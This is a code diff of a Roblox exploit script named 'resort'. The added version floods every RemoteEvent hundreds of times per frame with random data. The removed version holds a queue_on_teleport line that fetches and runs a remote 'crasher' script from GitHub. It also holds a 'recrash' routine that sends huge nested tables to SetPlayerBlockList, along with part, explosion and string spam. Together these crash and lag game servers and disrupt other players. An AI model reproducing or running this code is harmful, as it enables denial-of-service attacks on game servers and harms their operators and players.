@@ -2,734 +2,198 @@ local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local RunService = game:GetService("RunService")
 local StarterGui = game:GetService("StarterGui")
-local Workspace = game:GetService("Workspace")
+local UserInputService = game:GetService("UserInputService")
 local LocalPlayer = Players.LocalPlayer
 local active = false
-local guiOpen = false
-local scriptEnabled = true
+local guiVisible = true
+local connections = {}
 
 pcall(function()
     StarterGui:SetCore("SendNotification", {
-        Title = "resort";
-        Text = "resort load";
+        Title = ".resort";
+        Text = "ready (ctrl to toggle)";
         Duration = 3;
     })
 end)
 
-pcall(function()
-    if syn and syn.queue_on_teleport then
-        syn.queue_on_teleport(game:HttpGet("https://raw.githubusercontent.com/codexvsberkerxylo/scripts/refs/heads/main/crasher"))
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "ResortGUI"
+ScreenGui.ResetOnSpawn = false
+ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+local MainFrame = Instance.new("Frame")
+MainFrame.Name = "MainFrame"
+MainFrame.Size = UDim2.new(0, 180, 0, 80)
+MainFrame.Position = UDim2.new(0.5, -90, 0.1, 0)
+MainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+MainFrame.BorderSizePixel = 0
+MainFrame.Parent = ScreenGui
+
+local UICorner = Instance.new("UICorner")
+UICorner.CornerRadius = UDim.new(0, 10)
+UICorner.Parent = MainFrame
+
+local DragBorder = Instance.new("Frame")
+DragBorder.Name = "DragBorder"
+DragBorder.Size = UDim2.new(1, 0, 0, 25)
+DragBorder.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
+DragBorder.BorderSizePixel = 0
+DragBorder.Parent = MainFrame
+
+local DragCorner = Instance.new("UICorner")
+DragCorner.CornerRadius = UDim.new(0, 10)
+DragCorner.Parent = DragBorder
+
+local DragFix = Instance.new("Frame")
+DragFix.Size = UDim2.new(1, 0, 0, 13)
+DragFix.Position = UDim2.new(0, 0, 0, 12)
+DragFix.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
+DragFix.BorderSizePixel = 0
+DragFix.Parent = DragBorder
+
+local Title = Instance.new("TextLabel")
+Title.Size = UDim2.new(1, 0, 1, 0)
+Title.BackgroundTransparency = 1
+Title.Text = ".resort"
+Title.TextColor3 = Color3.fromRGB(255, 70, 70)
+Title.TextSize = 14
+Title.Font = Enum.Font.GothamBold
+Title.Parent = DragBorder
+
+local ResortButton = Instance.new("TextButton")
+ResortButton.Name = "ResortButton"
+ResortButton.Size = UDim2.new(1, -20, 0, 40)
+ResortButton.Position = UDim2.new(0, 10, 0, 30)
+ResortButton.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+ResortButton.Text = "start"
+ResortButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+ResortButton.TextSize = 16
+ResortButton.Font = Enum.Font.GothamBold
+ResortButton.BorderSizePixel = 0
+ResortButton.Parent = MainFrame
+
+local ButtonCorner = Instance.new("UICorner")
+ButtonCorner.CornerRadius = UDim.new(0, 8)
+ButtonCorner.Parent = ResortButton
+
+local function stopResort()
+    for _, conn in pairs(connections) do
+        conn:Disconnect()
+    end
+    connections = {}
+    active = false
+    ResortButton.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+    ResortButton.Text = "start"
+    
+    pcall(function()
+        StarterGui:SetCore("SendNotification", {
+            Title = ".resort";
+            Text = "stopped";
+            Duration = 2;
+        })
+    end)
+end
+
+local function startResort()
+    active = true
+    ResortButton.BackgroundColor3 = Color3.fromRGB(60, 100, 60)
+    ResortButton.Text = "running"
+    
+    pcall(function()
+        StarterGui:SetCore("SendNotification", {
+            Title = "Resort";
+            Text = "started";
+            Duration = 2;
+        })
+    end)
+    
+    for _, remote in pairs(ReplicatedStorage:GetDescendants()) do
+        if remote:IsA("RemoteEvent") then
+            local conn = RunService.Heartbeat:Connect(function()
+                for i = 1, 500 do
+                    pcall(function()
+                        remote:FireServer(math.random(), math.random(), math.random())
+                    end)
+                end
+            end)
+            table.insert(connections, conn)
+        end
+    end
+end
+
+ResortButton.MouseButton1Click:Connect(function()
+    if not active then
+        startResort()
+    else
+        stopResort()
     end
 end)
 
-local function spamParts(amount)
-    spawn(function()
-        for i = 1, amount do
-            local part = Instance.new("Part")
-            part.Size = Vector3.new(50, 50, 50)
-            part.Anchored = true
-            part.CFrame = CFrame.new(math.random(-1000, 1000), math.random(100, 500), math.random(-1000, 1000))
-            part.BrickColor = BrickColor.random()
-            part.Material = Enum.Material.Neon
-            part.Parent = Workspace
-            
-            local smoke = Instance.new("Smoke", part)
-            smoke.Size = 100
-            local fire = Instance.new("Fire", part)
-            fire.Size = 100
-            local sparkles = Instance.new("Sparkles", part)
-        end
-    end)
+ResortButton.MouseEnter:Connect(function()
+    if not active then
+        ResortButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+    end
+end)
+
+ResortButton.MouseLeave:Connect(function()
+    if not active then
+        ResortButton.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+    end
+end)
+
+-- Dragging functionality
+local dragging
+local dragInput
+local dragStart
+local startPos
+
+local function update(input)
+    local delta = input.Position - dragStart
+    MainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
 end
 
-local function spamSounds(amount)
-    spawn(function()
-        for i = 1, amount do
-            local sound = Instance.new("Sound")
-            sound.SoundId = "rbxassetid://" .. math.random(1000000, 9999999)
-            sound.Volume = 10
-            sound.Looped = true
-            sound.Parent = Workspace
-            sound:Play()
-        end
-    end)
-end
-
-local function spamExplosions(amount)
-    spawn(function()
-        for i = 1, amount do
-            local explosion = Instance.new("Explosion")
-            explosion.Position = Vector3.new(math.random(-500, 500), math.random(0, 500), math.random(-500, 500))
-            explosion.BlastRadius = 100
-            explosion.BlastPressure = 1000000
-            explosion.Parent = Workspace
-            task.wait(0.1)
-        end
-    end)
-end
-
-local function createGUI()
-    local ScreenGui = Instance.new("ScreenGui")
-    ScreenGui.Name = "ResortGUI"
-    ScreenGui.ResetOnSpawn = false
-    ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-    
-    local MainFrame = Instance.new("Frame")
-    MainFrame.Name = "MainFrame"
-    MainFrame.Size = UDim2.new(0, 450, 0, 550)
-    MainFrame.Position = UDim2.new(0.5, -225, 0.5, -275)
-    MainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-    MainFrame.BorderSizePixel = 0
-    MainFrame.Parent = ScreenGui
-    
-    local UICorner = Instance.new("UICorner")
-    UICorner.CornerRadius = UDim.new(0, 12)
-    UICorner.Parent = MainFrame
-    
-    local Shadow = Instance.new("Frame")
-    Shadow.Name = "Shadow"
-    Shadow.Size = UDim2.new(1, 30, 1, 30)
-    Shadow.Position = UDim2.new(0, -15, 0, -15)
-    Shadow.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-    Shadow.BackgroundTransparency = 0.7
-    Shadow.BorderSizePixel = 0
-    Shadow.ZIndex = 0
-    Shadow.Parent = MainFrame
-    
-    local ShadowCorner = Instance.new("UICorner")
-    ShadowCorner.CornerRadius = UDim.new(0, 12)
-    ShadowCorner.Parent = Shadow
-    
-    local TopBar = Instance.new("Frame")
-    TopBar.Name = "TopBar"
-    TopBar.Size = UDim2.new(1, 0, 0, 50)
-    TopBar.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
-    TopBar.BorderSizePixel = 0
-    TopBar.Parent = MainFrame
-    
-    local TopBarCorner = Instance.new("UICorner")
-    TopBarCorner.CornerRadius = UDim.new(0, 12)
-    TopBarCorner.Parent = TopBar
-    
-    local TopBarFix = Instance.new("Frame")
-    TopBarFix.Size = UDim2.new(1, 0, 0, 25)
-    TopBarFix.Position = UDim2.new(0, 0, 0, 25)
-    TopBarFix.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
-    TopBarFix.BorderSizePixel = 0
-    TopBarFix.Parent = TopBar
-    
-    local Title = Instance.new("TextLabel")
-    Title.Name = "Title"
-    Title.Size = UDim2.new(1, -20, 1, 0)
-    Title.Position = UDim2.new(0, 20, 0, 0)
-    Title.BackgroundTransparency = 1
-    Title.Text = "RESORT"
-    Title.TextColor3 = Color3.fromRGB(255, 255, 255)
-    Title.TextSize = 24
-    Title.Font = Enum.Font.GothamBold
-    Title.TextXAlignment = Enum.TextXAlignment.Left
-    Title.Parent = TopBar
-    
-    local CloseButton = Instance.new("TextButton")
-    CloseButton.Name = "CloseButton"
-    CloseButton.Size = UDim2.new(0, 40, 0, 40)
-    CloseButton.Position = UDim2.new(1, -45, 0, 5)
-    CloseButton.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-    CloseButton.Text = "×"
-    CloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-    CloseButton.TextSize = 28
-    CloseButton.Font = Enum.Font.GothamBold
-    CloseButton.BorderSizePixel = 0
-    CloseButton.Parent = TopBar
-    
-    local CloseCorner = Instance.new("UICorner")
-    CloseCorner.CornerRadius = UDim.new(0, 8)
-    CloseCorner.Parent = CloseButton
-    
-    local ScrollFrame = Instance.new("ScrollingFrame")
-    ScrollFrame.Name = "ScrollFrame"
-    ScrollFrame.Size = UDim2.new(1, -30, 1, -80)
-    ScrollFrame.Position = UDim2.new(0, 15, 0, 65)
-    ScrollFrame.BackgroundTransparency = 1
-    ScrollFrame.ScrollBarThickness = 4
-    ScrollFrame.ScrollBarImageColor3 = Color3.fromRGB(255, 255, 255)
-    ScrollFrame.BorderSizePixel = 0
-    ScrollFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
-    ScrollFrame.Parent = MainFrame
-    
-    local UIListLayout = Instance.new("UIListLayout")
-    UIListLayout.Padding = UDim.new(0, 10)
-    UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
-    UIListLayout.Parent = ScrollFrame
-    
-    local function createButton(name, description, callback)
-        local Button = Instance.new("Frame")
-        Button.Name = name
-        Button.Size = UDim2.new(1, 0, 0, 70)
-        Button.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-        Button.BorderSizePixel = 0
-        Button.Parent = ScrollFrame
+DragBorder.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 then
+        dragging = true
+        dragStart = input.Position
+        startPos = MainFrame.Position
         
-        local ButtonCorner = Instance.new("UICorner")
-        ButtonCorner.CornerRadius = UDim.new(0, 8)
-        ButtonCorner.Parent = Button
-        
-        local ButtonTitle = Instance.new("TextLabel")
-        ButtonTitle.Name = "Title"
-        ButtonTitle.Size = UDim2.new(1, -20, 0, 25)
-        ButtonTitle.Position = UDim2.new(0, 15, 0, 10)
-        ButtonTitle.BackgroundTransparency = 1
-        ButtonTitle.Text = name
-        ButtonTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
-        ButtonTitle.TextSize = 18
-        ButtonTitle.Font = Enum.Font.GothamBold
-        ButtonTitle.TextXAlignment = Enum.TextXAlignment.Left
-        ButtonTitle.Parent = Button
-        
-        local ButtonDesc = Instance.new("TextLabel")
-        ButtonDesc.Name = "Description"
-        ButtonDesc.Size = UDim2.new(1, -20, 0, 20)
-        ButtonDesc.Position = UDim2.new(0, 15, 0, 35)
-        ButtonDesc.BackgroundTransparency = 1
-        ButtonDesc.Text = description
-        ButtonDesc.TextColor3 = Color3.fromRGB(150, 150, 150)
-        ButtonDesc.TextSize = 13
-        ButtonDesc.Font = Enum.Font.Gotham
-        ButtonDesc.TextXAlignment = Enum.TextXAlignment.Left
-        ButtonDesc.Parent = Button
-        
-        local ClickButton = Instance.new("TextButton")
-        ClickButton.Size = UDim2.new(1, 0, 1, 0)
-        ClickButton.BackgroundTransparency = 1
-        ClickButton.Text = ""
-        ClickButton.Parent = Button
-        
-        ClickButton.MouseButton1Click:Connect(function()
-            Button.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-            ButtonTitle.TextColor3 = Color3.fromRGB(0, 0, 0)
-            ButtonDesc.TextColor3 = Color3.fromRGB(50, 50, 50)
-            task.wait(0.1)
-            Button.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-            ButtonTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
-            ButtonDesc.TextColor3 = Color3.fromRGB(150, 150, 150)
-            callback()
-        end)
-        
-        ClickButton.MouseEnter:Connect(function()
-            Button.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
-        end)
-        
-        ClickButton.MouseLeave:Connect(function()
-            Button.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+        input.Changed:Connect(function()
+            if input.UserInputState == Enum.UserInputState.End then
+                dragging = false
+            end
         end)
     end
-    
-    createButton("Resort", "Spam all RemoteEvents with random data", function()
-        if not active then
-            active = true
-            pcall(function()
-                StarterGui:SetCore("SendNotification", {
-                    Title = "resort";
-                    Text = "resort activated";
-                    Duration = 2;
-                })
-            end)
-            for _, remote in pairs(ReplicatedStorage:GetDescendants()) do
-                if remote:IsA("RemoteEvent") then
-                    RunService.Heartbeat:Connect(function()
-                        for i = 1, 100 do
-                            remote:FireServer(math.random(), math.random(), math.random())
-                        end
-                    end)
-                end
-            end
-        else
-            StarterGui:SetCore("SendNotification", {
-                Title = "resort";
-                Text = "already running";
-                Duration = 2;
-            })
-        end
-    end)
-    
-    createButton("Recrash", "Network bomb method for maximum lag", function()
-        pcall(function()
-            StarterGui:SetCore("SendNotification", {
-                Title = "resort";
-                Text = "recrash initiated";
-                Duration = 2;
-            })
-        end)
-        
-        shared.TeleportToSky = false
-        if shared.TeleportToSky then
-            local char = LocalPlayer.Character
-            char.HumanoidRootPart.CFrame = CFrame.new(0, 9e9, 0)
-            task.wait(0.5)
-            char.HumanoidRootPart.Anchored = true
-        end
-        
-        spawn(function()
-            while wait(1.5) do
-                game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge * math.huge)
-                local function getmaxvalue(val)
-                    local mainvalueifonetable = 499999
-                    if type(val) ~= "number" then
-                        return nil
-                    end
-                    local calculateperfectval = (mainvalueifonetable/(val+2))
-                    return calculateperfectval
-                end
-                
-                local function bomb(tableincrease, tries)
-                    local maintable = {}
-                    local spammedtable = {}
-                    
-                    table.insert(spammedtable, {})
-                    z = spammedtable[1]
-                    
-                    for i = 1, tableincrease do
-                        local tableins = {}
-                        table.insert(z, tableins)
-                        z = tableins
-                    end
-                    
-                    local calculatemax = getmaxvalue(tableincrease)
-                    local maximum
-                    
-                    if calculatemax then
-                        maximum = calculatemax
-                    else
-                        maximum = 999999
-                    end
-                    
-                    for i = 1, maximum do
-                        table.insert(maintable, spammedtable)
-                    end
-                    
-                    for i = 1, tries do
-                        game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(maintable)
-                    end
-                end
-                
-                bomb(289, 5)
-            end
-        end)
-    end)
-    
-    createButton("Last Resort", "Spawn parts and continuous explosions", function()
-        pcall(function()
-            StarterGui:SetCore("SendNotification", {
-                Title = "resort";
-                Text = "lastresort activated";
-                Duration = 2;
-            })
-        end)
-        
-        spamParts(500)
-        spamExplosions(200)
-        
-        spawn(function()
-            while wait(0.5) do
-                spamExplosions(50)
-            end
-        end)
-    end)
-    
-    createButton("Flood", "Continuous part spawning every 0.1s", function()
-        pcall(function()
-            StarterGui:SetCore("SendNotification", {
-                Title = "resort";
-                Text = "flood activated";
-                Duration = 2;
-            })
-        end)
-        
-        spawn(function()
-            while wait(0.1) do
-                spamParts(100)
-            end
-        end)
-    end)
-    
-    createButton("Chaos", "Everything at once - maximum destruction", function()
-        pcall(function()
-            StarterGui:SetCore("SendNotification", {
-                Title = "resort";
-                Text = "chaos activated";
-                Duration = 2;
-            })
-        end)
-        
-        spamParts(1000)
-        spamSounds(100)
-        spamExplosions(500)
-        
-        spawn(function()
-            while wait(0.05) do
-                spamParts(50)
-                spamExplosions(25)
-            end
-        end)
-        for _, remote in pairs(ReplicatedStorage:GetDescendants()) do
-            if remote:IsA("RemoteEvent") then
-                spawn(function()
-                    while wait() do
-                        for i = 1, 200 do
-                            remote:FireServer(string.rep("A", 10000))
-                        end
-                    end
-                end)
-            end
-        end
-    end)
-    
-    createButton("Earthquake", "Make all unanchored parts fly around", function()
-        pcall(function()
-            StarterGui:SetCore("SendNotification", {
-                Title = "resort";
-                Text = "earthquake activated";
-                Duration = 2;
-            })
-        end)
-        
-        spawn(function()
-            while wait() do
-                for _, obj in pairs(Workspace:GetDescendants()) do
-                    if obj:IsA("BasePart") and obj.Anchored == false then
-                        obj.Velocity = Vector3.new(math.random(-500, 500), math.random(-500, 500), math.random(-500, 500))
-                        obj.RotVelocity = Vector3.new(math.random(-100, 100), math.random(-100, 100), math.random(-100, 100))
-                    end
-                end
-            end
-        end)
-    end)
-    
-    createButton("Disco", "Spawn colorful neon parts with lights", function()
-        pcall(function()
-            StarterGui:SetCore("SendNotification", {
-                Title = "resort";
-                Text = "disco activated";
-                Duration = 2;
-            })
-        end)
-        
-        spawn(function()
-            while wait(0.1) do
-                for i = 1, 50 do
-                    local part = Instance.new("Part")
-                    part.Size = Vector3.new(30, 30, 30)
-                    part.Anchored = true
-                    part.CFrame = CFrame.new(math.random(-500, 500), math.random(50, 300), math.random(-500, 500))
-                    part.BrickColor = BrickColor.random()
-                    part.Material = Enum.Material.Neon
-                    part.Parent = Workspace
-                    
-                    local light = Instance.new("PointLight", part)
-                    light.Brightness = 10
-                    light.Range = 100
-                    light.Color = Color3.new(math.random(), math.random(), math.random())
-                end
-            end
-        end)
-    end)
-    
-    CloseButton.MouseButton1Click:Connect(function()
-        ScreenGui:Destroy()
-        guiOpen = false
-    end)
-    
-    local dragging
-    local dragInput
-    local dragStart
-    local startPos
-    
-    local function update(input)
-        local delta = input.Position - dragStart
-        MainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+end)
+
+DragBorder.InputChanged:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseMovement then
+        dragInput = input
     end
-    
-    TopBar.InputBegan:Connect(function(input)
-        if input.UserInputType == Enum.UserInputType.MouseButton1 then
-            dragging = true
-            dragStart = input.Position
-            startPos = MainFrame.Position
-            
-            input.Changed:Connect(function()
-                if input.UserInputState == Enum.UserInputState.End then
-                    dragging = false
-                end
-            end)
-        end
-    end)
-    
-    TopBar.InputChanged:Connect(function(input)
-        if input.UserInputType == Enum.UserInputType.MouseMovement then
-            dragInput = input
-        end
-    end)
-    
-    game:GetService("UserInputService").InputChanged:Connect(function(input)
-        if input == dragInput and dragging then
-            update(input)
-        end
-    end)
-    
-    UIListLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
-        ScrollFrame.CanvasSize = UDim2.new(0, 0, 0, UIListLayout.AbsoluteContentSize.Y + 10)
-    end)
-    
-    ScreenGui.Parent = game:GetService("CoreGui")
-    guiOpen = true
-end
+end)
+
+UserInputService.InputChanged:Connect(function(input)
+    if input == dragInput and dragging then
+        update(input)
+    end
+end)
+
+-- Ctrl to hide/show
+UserInputService.InputBegan:Connect(function(input, gameProcessed)
+    if not gameProcessed and input.KeyCode == Enum.KeyCode.LeftControl then
+        guiVisible = not guiVisible
+        MainFrame.Visible = guiVisible
+    end
+end)
+
+ScreenGui.Parent = game:GetService("CoreGui")
 
 LocalPlayer.Chatted:Connect(function(msg)
-    if not scriptEnabled then return end
-    
-    if msg:lower() == ".gui" then
-        if not guiOpen then
-            createGUI()
-            pcall(function()
-                StarterGui:SetCore("SendNotification", {
-                    Title = "resort";
-                    Text = "gui opened";
-                    Duration = 2;
-                })
-            end)
+    if msg:lower() == ".resort" then
+        if not active then
+            startResort()
         else
-            StarterGui:SetCore("SendNotification", {
-                Title = "resort";
-                Text = "gui already open";
-                Duration = 2;
-            })
+            stopResort()
         end
-    elseif msg:lower() == ".exitr" then
-        scriptEnabled = false
-        pcall(function()
-            if syn and syn.queue_on_teleport then
-                syn.queue_on_teleport("")
-            end
-        end)
-        
-        for _, gui in pairs(game:GetService("CoreGui"):GetChildren()) do
-            if gui.Name == "ResortGUI" then
-                gui:Destroy()
-            end
-        end
-        
-        pcall(function()
-            StarterGui:SetCore("SendNotification", {
-                Title = "resort";
-                Text = "script disabled";
-                Duration = 3;
-            })
-        end)
-        
-        task.wait(0.5)
-        script:Destroy()
-    elseif msg:lower() == ".resort" and not active then
-        active = true
-        pcall(function()
-            StarterGui:SetCore("SendNotification", {
-                Title = "resort";
-                Text = "resort activated";
-                Duration = 3;
-            })
-        end)
-        for _, remote in pairs(ReplicatedStorage:GetDescendants()) do
-            if remote:IsA("RemoteEvent") then
-                RunService.Heartbeat:Connect(function()
-                    for i = 1, 100 do
-                        remote:FireServer(math.random(), math.random(), math.random())
-                    end
-                end)
-            end
-        end
-    elseif msg:lower() == ".resort" and active then
-        StarterGui:SetCore("SendNotification", {
-            Title = "resort";
-            Text = "already running";
-            Duration = 2;
-        })
-    elseif msg:lower() == ".recrash" then
-        pcall(function()
-            StarterGui:SetCore("SendNotification", {
-                Title = "resort";
-                Text = "recrash initiated";
-                Duration = 2;
-            })
-        end)
-        
-        shared.TeleportToSky = false
-        if shared.TeleportToSky then
-            local char = LocalPlayer.Character
-            char.HumanoidRootPart.CFrame = CFrame.new(0, 9e9, 0)
-            task.wait(0.5)
-            char.HumanoidRootPart.Anchored = true
-        end
-        
-        spawn(function()
-            while wait(1.5) do
-                game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge * math.huge)
-                local function getmaxvalue(val)
-                    local mainvalueifonetable = 499999
-                    if type(val) ~= "number" then
-                        return nil
-                    end
-                    local calculateperfectval = (mainvalueifonetable/(val+2))
-                    return calculateperfectval
-                end
-                
-                local function bomb(tableincrease, tries)
-                    local maintable = {}
-                    local spammedtable = {}
-                    
-                    table.insert(spammedtable, {})
-                    z = spammedtable[1]
-                    
-                    for i = 1, tableincrease do
-                        local tableins = {}
-                        table.insert(z, tableins)
-                        z = tableins
-                    end
-                    
-                    local calculatemax = getmaxvalue(tableincrease)
-                    local maximum
-                    
-                    if calculatemax then
-                        maximum = calculatemax
-                    else
-                        maximum = 999999
-                    end
-                    
-                    for i = 1, maximum do
-                        table.insert(maintable, spammedtable)
-                    end
-                    
-                    for i = 1, tries do
-                        game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(maintable)
-                    end
-                end
-                
-                bomb(289, 5)
-            end
-        end)
-    
-    elseif msg:lower() == ".lastresort" then
-        pcall(function()
-            StarterGui:SetCore("SendNotification", {
-                Title = "resort";
-                Text = "lastresort activated";
-                Duration = 2;
-            })
-        end)
-        
-        spamParts(500)
-        spamExplosions(200)
-        
-        spawn(function()
-            while wait(0.5) do
-                spamExplosions(50)
-            end
-        end)
-    elseif msg:lower() == ".flood" then
-        pcall(function()
-            StarterGui:SetCore("SendNotification", {
-                Title = "resort";
-                Text = "flood activated";
-                Duration = 2;
-            })
-        end)
-        
-        spawn(function()
-            while wait(0.1) do
-                spamParts(100)
-            end
-        end)
-    elseif msg:lower() == ".chaos" then
-        pcall(function()
-            StarterGui:SetCore("SendNotification", {
-                Title = "resort";
-                Text = "chaos activated";
-                Duration = 2;
-            })
-        end)
-        
-        spamParts(1000)
-        spamSounds(100)
-        spamExplosions(500)
-        
-        spawn(function()
-            while wait(0.05) do
-                spamParts(50)
-                spamExplosions(25)
-            end
-        end)
-        for _, remote in pairs(ReplicatedStorage:GetDescendants()) do
-            if remote:IsA("RemoteEvent") then
-                spawn(function()
-                    while wait() do
-                        for i = 1, 200 do
-                            remote:FireServer(string.rep("A", 10000))
-                        end
-                    end
-                end)
-            end
-        end
-    
-    elseif msg:lower() == ".earthquake" then
-        pcall(function()
-            StarterGui:SetCore("SendNotification", {
-                Title = "resort";
-                Text = "earthquake activated";
-                Duration = 2;
-            })
-        end)
-        
-        spawn(function()
-            while wait() do
-                for _, obj in pairs(Workspace:GetDescendants()) do
-                    if obj:IsA("BasePart") and obj.Anchored == false then
-                        obj.Velocity = Vector3.new(math.random(-500, 500), math.random(-500, 500), math.random(-500, 500))
-                        obj.RotVelocity = Vector3.new(math.random(-100, 100), math.random(-100, 100), math.random(-100, 100))
-                    end
-                end
-            end
-        end)
-    
-    elseif msg:lower() == ".disco" then
-        pcall(function()
-            StarterGui:SetCore("SendNotification", {
-                Title = "resort";
-                Text = "disco activated";
-                Duration = 2;
-            })
-        end)
-        
-        spawn(function()
-            while wait(0.1) do
-                for i = 1, 50 do
-                    local part = Instance.new("Part")
-                    part.Size = Vector3.new(30, 30, 30)
-                    part.Anchored = true
-                    part.CFrame = CFrame.new(math.random(-500, 500), math.random(50, 300), math.random(-500, 500))
-                    part.BrickColor = BrickColor.random()
-                    part.Material = Enum.Material.Neon
-                    part.Parent = Workspace
-                    
-                    local light = Instance.new("PointLight", part)
-                    light.Brightness = 10
-                    light.Range = 100
-                    light.Color = Color3.new(math.random(), math.random(), math.random())
-                end
-            end
-        end)
-    
-    elseif msg:lower() == ".help" then
-        StarterGui:SetCore("SendNotification", {
-            Title = "resort";
-            Text = ".gui .exitr .resort .recrash .lastresort .flood .chaos .earthquake .disco";
-            Duration = 5;
-        })
     end
 end)
